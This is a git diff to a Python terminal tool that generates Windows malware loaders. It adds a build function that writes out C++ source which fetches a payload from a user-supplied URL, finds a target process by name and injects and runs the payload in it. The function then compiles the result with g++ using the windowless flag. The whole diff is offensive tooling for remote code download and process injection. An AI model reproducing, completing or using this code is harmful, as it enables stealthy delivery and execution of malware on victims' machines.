@@ -1,4 +1,6 @@
 from curses import wrapper, curs_set, textpad, window, A_REVERSE, KEY_UP, KEY_DOWN
+import os
+import time
 
 class Menu:
     def __init__(self, stdscr: window, posx: int, posy: int, items: list|tuple):
@@ -111,12 +113,13 @@ class RemoteInjectionView:
         enum_menu = Menu(self.curwindow, 1, 0, list(self.enum_types.keys()))
         enumeration_type = self.render_selection(enum_menu, "Select Process/Thread Enumeration Techinque")
         remote_injection_params["process_enum_type"] = enumeration_type
+        remote_injection_params["technique_header_file"] = self.enum_types[enumeration_type]["header_file"]
         
         if "callback_function" in self.enum_types[enumeration_type]:
             remote_injection_params.update(self.enum_types[enumeration_type]["callback_function"]())
             type_menu = Menu(self.curwindow, 1, 0, list(self.injection_types.keys()))
             remote_injection_params["injection_type"] = self.render_selection(type_menu, "Select Injection Type")
-            remote_injection_params["remote_injection_type_header_file"] = self.injection_types[remote_injection_params["injection_type"]]["header_file"]
+            remote_injection_params["injection_type_header_file"] = self.injection_types[remote_injection_params["injection_type"]]["header_file"]
 
         return remote_injection_params
 
@@ -164,7 +167,7 @@ class InjectionTechniqueView:
 
         injection_technique = self.render_technique_selection()
         injection_params["injection technique"] = injection_technique
-        injection_params["technique_header_file"] = self.techniques[injection_technique]["header_file"]
+        injection_params["injection_type_header_file"] = self.techniques[injection_technique]["header_file"]
 
         if "callback_function" in self.techniques[injection_technique]:
             injection_params.update(self.techniques[injection_technique]["callback_function"]())
@@ -179,6 +182,68 @@ def wait_for_enter(stdscr: window):
     
     if ch == 113:
         exit(0)
+
+def build (Enumeration, ProcessName, Loader, Url, Dict):
+    f = open ("main.cpp", "a")
+    f.write(f"""
+#include <iostream>
+#include <string>
+#include <Windows.h>
+#include <stdio.h>
+#include <wininet.h>
+#include "Libraries/FetchFromURL.h"
+#include "Libraires/{Enumeration}"
+#include "Libraries/{Loader}"
+
+using namespace std;
+
+int main()
+{{
+    PBYTE  pPayloadAddress;
+    DWORD pPayloadSize;
+    string Url  = "{Url}";
+    LPWSTR szProcessName = L"{ProcessName}";
+    DWORD dwProcessID;
+    HANDLE hProcess;
+    PBYTE InjectionAddress;
+    HANDLE hThread;
+    
+    if(!FetchFileFromURLA(Url.c_str(), &pPayloadAddress, &pPayloadSize)){{
+        cout << "Failed to fetch payload" << endl;
+        return 0;
+    }}
+
+    //Encrypt(pPayloadAddress, pPayloadSize, NULL, NULL);
+"""
+)
+    
+    if Enumeration in Dict:
+        f.write(
+f"""\n
+    if(!GetRemoteProcess(szProcessName, &dwProcessID, &hProcess)){{
+        cout << "Failed to find remote process" << endl;
+        return 0;
+    }}  
+
+""")
+
+    f.write(
+f"""\n
+
+    if(!PayloadExecute(hProcess, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, &hThread)){{
+        cout << "Failed to execute payload" << endl;
+        return 0;
+    }}
+
+    return 0;
+}}
+""")
+
+    f.close()
+    time.sleep(2)
+    os.system(f"C:\\msys64\\mingw64\\bin\\g++ -o chungus main.cpp -lwininet -lws2_32 -mwindows")
+    #result = subprocess.run(['g++', '-o', 'chungus', 'main.cpp','-lwininet', '-lws2_32', '-mwindows'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    #print(result)
 
 def main(stdscr: window):
     stdscr.border()
@@ -217,6 +282,9 @@ def main(stdscr: window):
 
         window.refresh()
         key = window.getch()
+    
+    print(injection_params)
+    #build(injection_params["technique_header_file"], injection_params["process_name"], injection_params["injection_type_header_file"], payload_url, injection_params)
 
 if __name__ == "__main__":
     wrapper(main)
